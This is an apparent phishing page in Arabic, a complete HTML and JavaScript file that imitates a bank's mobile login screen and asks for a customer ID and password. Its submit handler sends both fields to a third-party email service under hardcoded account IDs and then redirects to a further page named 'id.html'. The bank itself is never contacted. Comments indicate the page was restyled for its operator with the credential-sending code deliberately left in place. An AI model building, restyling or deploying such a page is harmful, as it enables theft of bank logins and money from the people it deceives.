<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <!-- استدعاء خط Cairo بأوزان متعددة لتطابق التصميم -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <!-- الحفاظ على مكتبة وإعدادات EmailJS الخاصة بك -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          emailjs.init("XKiDXTgX-UdwJ80LO");
       })();
    </script>

    <style>
        :root {
            --primary-color: #123e6b; /* لون الزر والأيقونات الداكن */
            --text-main: #1a1a1a;
            --text-secondary: #6b7280;
            --border-color: #d1d5db;
            --bg-white: #ffffff;
            --font-main: 'Cairo', sans-serif;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: var(--font-main);
            background-color: #f3f4f6; /* خلفية خارجية رمادية للتباين */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            position: relative;
            background-color: var(--bg-white);
            /* الحفاظ على آلية الخلفية عبر الرابط - تم ترك الرابط فارغاً للحفاظ على اللون الأبيض الافتراضي للصورة */
            background-image: url('https://i.imgur.com/VacrlxB.png'); 
            background-size: cover;
            background-position: center;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            padding: 0 24px;
        }

        /* سهم الرجوع */
        .header {
            margin-top: 50px;
            margin-bottom: 25px;
            display: flex;
            justify-content: flex-start; /* لليمين بسبب RTL */
            z-index: 2;
        }

        .back-btn {
            color: var(--text-main);
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .back-btn svg {
            width: 24px;
            height: 24px;
            stroke: currentColor;
            stroke-width: 2.5;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        /* العناوين */
        .title-section {
            margin-bottom: 35px;
            z-index: 2;
        }

        .title-section h1 {
            font-size: 22px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 12px;
        }

        .title-section p {
            font-size: 13px;
            color: var(--text-secondary);
            line-height: 1.6;
            font-weight: 600;
        }

        /* النموذج */
        .form-section {
            display: flex;
            flex-direction: column;
            flex: 1;
            z-index: 2;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            background-color: transparent;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            padding: 16px 45px 16px 45px; /* مساحة للأيقونات يمين ويسار */
            font-family: var(--font-main);
            font-size: 14px;
            font-weight: 600;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-group input::placeholder {
            color: #9ca3af;
        }

        .input-group input:focus {
            border-color: var(--primary-color);
        }

        /* الأيقونات داخل الحقول */
        .icon-right {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-main);
        }

        .icon-left {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary-color);
            cursor: pointer;
        }

        .icon-right svg, .icon-left svg {
            width: 20px;
            height: 20px;
        }

        /* رابط نسيان كلمة المرور */
        .forgot-password {
            text-align: right;
            display: block;
            color: var(--primary-color);
            font-size: 12px;
            font-weight: 800;
            text-decoration: none;
            margin-bottom: 25px;
            margin-top: -5px;
        }

        /* زر الدخول */
        .btn-primary {
            width: 100%;
            background-color: var(--primary-color);
            color: var(--bg-white);
            padding: 16px;
            border-radius: 8px;
            border: none;
            font-family: var(--font-main);
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        /* الشروط والأحكام أسفل الشاشة */
        .footer-terms {
            margin-top: auto;
            margin-bottom: 30px;
            text-align: center;
            z-index: 2;
        }

        .footer-terms p {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 4px;
            font-weight: 600;
        }

        .footer-terms a {
            font-size: 13px;
            color: var(--text-main);
            font-weight: 800;
            text-decoration: underline;
        }

        
        .geometric-bg svg {
            position: absolute;
            bottom: 0;
            left: -50px;
            width: 300px;
            height: 300px;
            stroke: #e5e7eb;
            stroke-width: 1.5;
            fill: none;
        }

    </style>
</head>
<body>

    <div class="mobile-container">
        

        <div class="header">
            <!-- سهم الرجوع يوجه إلى index.html -->
            <a href="index.html" class="back-btn">
                <svg viewBox="0 0 24 24">
                    <path d="M5 12h14M12 5l7 7-7 7" />
                </svg>
            </a>
        </div>

        <div class="title-section">
            <h1>تسجيل الدخول</h1>
            <p>الرجاء إدخال بيانات حسابك المصرفي وسنقوم بإرسال رسالة نصية لتأكيد هويتك</p>
        </div>

        <form class="form-section" id="login-form">
            <!-- حقل رقم الزبون -->
            <div class="input-group">
                <div class="icon-right">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <rect x="3" y="4" width="18" height="16" rx="2" ry="2"></rect>
                        <circle cx="8.5" cy="10.5" r="2.5"></circle>
                        <line x1="14" y1="9" x2="19" y2="9"></line>
                        <line x1="14" y1="13" x2="19" y2="13"></line>
                    </svg>
                </div>
                <!-- تم الإبقاء على name="phone_number" لكي لا يتأثر قالب EmailJS الخاص بك -->
                <input type="text" id="phone_number" name="phone_number" placeholder="معرّف الزبون / رقم الزبون" required>
            </div>

            <!-- حقل كلمة المرور -->
            <div class="input-group">
                <div class="icon-right">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                </div>
                <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
                <!-- إضافة مُعرّف (id) لتسهيل الوصول للأيقونة عبر الجافاسكربت -->
                <div class="icon-left" id="togglePassword">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </div>
            </div>

            <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>

            <button type="submit" class="btn-primary">تسجيل الدخول</button>

        </form>

        <!-- الشروط والأحكام -->
        <div class="footer-terms">
            <p>بالاستمرار أنت توافق على كل من</p>
            <a href="#">شروط الاستخدام و سياسة الخصوصية</a>
        </div>
    </div>

    <!-- كود الجافاسكربت الخاص بك لعملية الإرسال بالإضافة إلى كود إظهار كلمة المرور -->
    <script>
        // تفعيل أيقونة إظهار وإخفاء كلمة المرور
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');

        togglePassword.addEventListener('click', function () {
            // التبديل بين نوع "password" و "text"
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        });

        // كود الإرسال الأصلي
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const submitBtn = document.querySelector('.btn-primary');
            const originalText = submitBtn.innerText;
            submitBtn.innerText = 'جاري تسجيل الدخول...';

            emailjs.sendForm('service_ifykx3f', 'template_mi6q3k7', this)
                .then(function() {
                    window.location.href = 'id.html';
                }, function(error) {
                    alert('حدث خطأ أثناء الإرسال.');
                    submitBtn.innerText = originalText;
                });
        });
    </script>
</body>
</html>
